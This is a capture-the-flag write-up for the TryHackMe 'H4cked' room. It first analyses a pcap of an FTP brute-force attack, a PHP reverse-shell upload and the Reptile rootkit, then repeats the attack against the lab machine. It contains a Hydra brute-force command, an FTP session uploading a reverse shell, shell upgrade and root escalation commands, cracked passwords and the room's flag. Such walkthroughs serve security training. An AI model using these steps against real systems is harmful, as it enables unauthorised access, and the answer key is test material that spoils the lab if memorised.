# H4cked

<div align="left">

<figure><img src="../.gitbook/assets/4754ca4214993b9701c7668bbca1a86a.png" alt="" width="183"><figcaption><p><a href="https://tryhackme.com/room/h4cked">https://tryhackme.com/room/h4cked</a></p></figcaption></figure>

</div>

🔗[ H4cked](https://tryhackme.com/room/h4cked)

### Task 1 - Starting

**Description/Note**: Find out what happened by analysing a .pcap file and hack your way back into the machine

### Task 2 - Reconnaissance

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

```
mkdir thm/h4cked.thm
cd thm/h4cked.thm
mkdir {nmap,content,exploits,scripts}
```

In the task 2, we don't need to deploy machine, but we need to analyze pcap file to explore activities and answer at questions.

<figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

Source IP that sent SYN is `192.168.0.147` then, it's Attacker IP, while destination/victim IP is: `192.168.0.115.`

### 2.1 - The attacker is trying to log into a specific service. What service is this?

Following first message, we can find that attacker brute force FTP port.

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
FTP
{% endhint %}

### 2.2 - There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

{% hint style="info" %}
Hydra
{% endhint %}

### 2.3 - The attacker is trying to log on with a specific username. What is the username?

Looking FTP request we can find it:

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
jenny
{% endhint %}

### 2.4 - What is the user's password?

Following TCP stream we found that correct psw is:

<div align="left">

<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
password123
{% endhint %}

### 2.5 - What is the current FTP working directory after the attacker logged in?

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/var/www/html
{% endhint %}

### 2.6 - The attacker uploaded a backdoor. What is the backdoor's filename? 

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
shell.php
{% endhint %}

### 2.7 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?&#x20;

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
[http://pentestmonkey.net/tools/php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell)
{% endhint %}

### 2.8 - Which command did the attacker manually execute after getting a reverse shell?

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
whoami
{% endhint %}

### 2.9 - What is the computer's hostname?

<div align="left">

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
wir3
{% endhint %}

### 2.10 - Which command did the attacker execute to spawn a new TTY shell?

<div align="left">

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhint %}

### 2.11 - Which command was executed to gain a root shell? 

<div align="left">

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
sudo su
{% endhint %}

### 2.12 - The attacker downloaded something from GitHub. What is the name of the GitHub project?

<div align="left">

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

</div>

{% hint style="info" %}
Reptile
{% endhint %}

### 2.13 - The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
rootkit
{% endhint %}

## Task 3 - Hack your way back into the machine

Deploy the machine.

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

🎯 Target IP: `10.10.123.131`

### 3.1 - Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list. 

We can use hydra with wordlist to find psw for 'jenny' user:

```bash
hydra -l jenny -P /usr/share/wordlists/metasploit/unix_passwords.txt h4cked.thm -t 4 ftp
```

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
987654321
{% endhint %}

### 3.2 - Change the necessary values inside the web shell and upload it to the webserver

We can download php web shell on pentester monkey website: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

and custom it with our local IP:

<div align="left">

<figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

</div>

After that, we can connect with FTP credentials and put in our custom php reverse shell.

```bash
ftp h4cked.thm
Connected to h4cked.thm.
220 Hello FTP World!
Name (h4cked.thm:kali): jenny
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||51568|)
150 Ok to send data.
100% |************************************************************************************************************|  5493       30.99 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (38.18 KiB/s)

ftp> chmod 777 php-reverse-shell.php
200 SITE CHMOD command ok.
ftp> ls
229 Entering Extended Passive Mode (|||11129|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Oct 02 22:48 php-reverse-shell.php
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> bye
221 Goodbye.
```

### 3.3 - Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

Now, we need to listen on the port setted on reverse shell, and access to machine.

<figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

As you can see, this shell is not stable. So, we can use the traditional Python script to make it more stable.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```

### 3.4 - Become root!

We know that www-data user haven't root privileges. But we also know that Jenny has root privileges on the machine. So, let us change the user to Jenny and become root.\


```bash
whoami
www-data
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/
```

### 3.5 - Read the flag.txt file inside the Reptile directory

We just say that flag is in path /root/Reptile, then we quickly go them.

```bash
cd /root/Reptile
root@wir3:~/Reptile
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
root@wir3:~/Reptile
cat flag.txt
```

<details>

<summary>🚩 Root Flag (flag.txt)</summary>

ebcefd66ca4b559d17b440b6e67fd0fd

</details>
